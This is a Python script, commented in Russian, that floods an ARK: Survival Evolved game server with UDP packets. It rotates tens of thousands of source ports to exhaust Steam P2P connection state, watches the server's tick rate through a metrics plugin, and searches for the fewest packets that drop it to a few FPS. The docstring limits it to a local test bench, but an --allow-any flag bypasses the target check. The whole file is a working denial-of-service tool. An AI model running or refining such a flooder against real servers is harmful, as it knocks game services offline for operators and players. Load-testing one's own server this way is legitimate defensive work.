# -*- coding: utf-8 -*-
"""
ark_lab_fps_hunt.py — охота за минимальным числом пакетов, роняющих FPS сервера
ARK SE до заданного порога (например, до 2-3 FPS).

Модель стоимости (проверяется этим же инструментом):
  * «стоимость на пакет» - каждый датаграмм с нового адреса источника создаёт
    состояние в Steam P2P-слое (m_mapP2PConnectionRequests в steamclient64);
  * «стоимость на байт» - копирование/валидация полезной нагрузки.

Поэтому инструмент умеет независимо варьировать:
  --payload-size  размер датаграммы (64 ... 1400);
  --ports         число РАЗНЫХ портов источника (state per source address);
  --rate         темп отправки, пакетов/с;
и непрерывно следит за FPS плагина NetGuard, останавливаясь, как только FPS
опустился ниже --target-fps.

Только локальный стенд (127.0.0.1 / 192.168.8.218). Без спуфинга.
"""
from __future__ import annotations

import argparse
import os
import socket
import statistics
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ark_lab_metrics import NetGuardClient, MetricsError  # noqa: E402
from ark_lab_net import guard_target, LabTargetError, pick_pid, ProcessMeter  # noqa: E402

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass


class SourcePool:
    """Пул UDP-сокетов, привязанных к РАЗНЫМ портам источника.

    Новый порт источника = новый адрес для сервера = новая запись в
    состоянии P2P-слоя. Пул переиспользуется по кругу.
    """

    def __init__(self, host: str, port: int, size: int, payload_size: int,
                 first_port: int = 20000):
        self.host = host
        self.port = port
        self.size = size
        self.payload = os.urandom(payload_size)
        self.socks: list[socket.socket] = []
        self.first_port = first_port
        self.created = 0
        self._lock = threading.Lock()

    def _make(self) -> socket.socket | None:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(("0.0.0.0", self.first_port + (self.created % 40000)))
        except OSError:
            try:
                s.bind(("0.0.0.0", 0))
            except OSError:
                s.close()
                return None
        self.created += 1
        return s

    def send(self) -> bool:
        with self._lock:
            if len(self.socks) < self.size:
                s = self._make()
                if s is None:
                    return False
                self.socks.append(s)
                idx = len(self.socks) - 1
            else:
                idx = self.created % self.size
                self.created += 1
            s = self.socks[idx]
        try:
            s.sendto(self.payload, (self.host, self.port))
            return True
        except OSError:
            return False

    def close(self) -> None:
        for s in self.socks:
            try:
                s.close()
            except OSError:
                pass
        self.socks.clear()


def hunt(args) -> dict:
    pool = SourcePool(args.host, args.game_port, args.ports, args.payload_size)
    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()
    pid = pick_pid("ShooterGameServer.exe", args.server_filter)
    meter = ProcessMeter(pid)

    def status():
        s = m.status()
        return (float(s.get("tps", 0.0) or 0.0), float(s.get("tickMs", 0.0) or 0.0),
                int(s.get("memKB", 0) or 0), int(s.get("liveConnections", 0) or 0))

    tps0, tick0, mem0, live0 = status()
    print("=" * 78)
    print("Охота за FPS: payload=%d B, портов источника=%d, темп=%s pps, цель FPS<=%d"
          % (args.payload_size, args.ports, ("%d" % args.rate) if args.rate else "max",
             args.target_fps))
    print("=" * 78)
    print("  фон: tps=%.1f tick=%.2f ms mem=%d МБ живых соединений=%d"
          % (tps0, tick0, mem0 // 1024, live0))

    stop = threading.Event()
    sent = [0]
    lock = threading.Lock()
    errors = [0]

    def worker() -> None:
        interval = (1.0 / args.rate) if args.rate else 0.0
        while not stop.is_set():
            if pool.send():
                with lock:
                    sent[0] += 1
            else:
                with lock:
                    errors[0] += 1
            if interval:
                time.sleep(interval)

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(args.threads)]
    for t in threads:
        t.start()

    curve = []
    t_start = time.time()
    hit = None
    cpu0 = meter.sample()
    while time.time() - t_start < args.max_seconds:
        time.sleep(args.sample_interval)
        tps, tick, mem, live = status()
        el = time.time() - t_start
        with lock:
            n = sent[0]
        curve.append((el, n, tps, tick))
        print("  t+%5.1fs  пакетов %8d (%6.0f pps)  tps %5.1f  tick %6.2f ms  "
              "mem %5d МБ  соединений %d"
              % (el, n, n / max(1.0, el), tps, tick, mem // 1024, live))
        if tps > 0 and tps <= args.target_fps:
            hit = (el, n, tps)
            break
    stop.set()
    for t in threads:
        t.join(timeout=2.0)
    cpu1 = meter.sample()
    dt = cpu1["t"] - cpu0["t"]
    cpu_pct = ((cpu1["cpu"] - cpu0["cpu"]) / dt * 100.0) if dt > 0 else 0.0
    pool.close()
    m.close()

    tps_end, tick_end, mem_end, live_end = status() if True else (0, 0, 0, 0)
    print("\n  ИТОГО: пакетов %d за %.1f с (%.0f pps), ошибок %d, CPU %.1f%%"
          % (sent[0], time.time() - t_start, sent[0] / max(1.0, time.time() - t_start),
             errors[0], cpu_pct))
    print("  tps %.1f -> %.1f   tick %.2f -> %.2f ms   mem %d -> %d МБ   живых соединений %d -> %d"
          % (tps0, tps_end, tick0, tick_end, mem0 // 1024, mem_end // 1024, live0, live_end))
    if hit:
        print("  >>> ЦЕЛЬ ДОСТИГНУТА: tps<=%.0f через %.1f с и %d пакетов" %
              (args.target_fps, hit[0], hit[1]))
    else:
        print("  >>> ЦЕЛЬ НЕ ДОСТИГНУТА за %.0f с (минимальный tps за окно = %.1f)"
              % (args.max_seconds, min(c[2] for c in curve) if curve else 0.0))
    return {"sent": sent[0], "tps0": tps0, "tps_end": tps_end, "tick0": tick0,
            "tick_end": tick_end, "cpu_pct": cpu_pct, "hit": bool(hit),
            "hit_packets": hit[1] if hit else 0, "curve": curve}


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Поиск минимального числа пакетов для падения FPS")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--payload-size", type=int, default=64)
    ap.add_argument("--ports", type=int, default=40000,
                    help="сколько разных портов источника использовать")
    ap.add_argument("--rate", type=int, default=0, help="темп, пакетов/с (0 = максимум)")
    ap.add_argument("--threads", type=int, default=8)
    ap.add_argument("--target-fps", type=float, default=5.0)
    ap.add_argument("--max-seconds", type=float, default=120.0)
    ap.add_argument("--sample-interval", type=float, default=1.0)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--server-filter", default="Server2")
    ap.add_argument("--allow-any", action="store_true")
    args = ap.parse_args(argv)

    try:
        guard_target(args.host, args.allow_any)
    except LabTargetError as exc:
        print("[!] %s" % (exc,))
        return 2

    try:
        hunt(args)
    except KeyboardInterrupt:
        print("\n[!] прервано")
    return 0


if __name__ == "__main__":
    sys.exit(main())
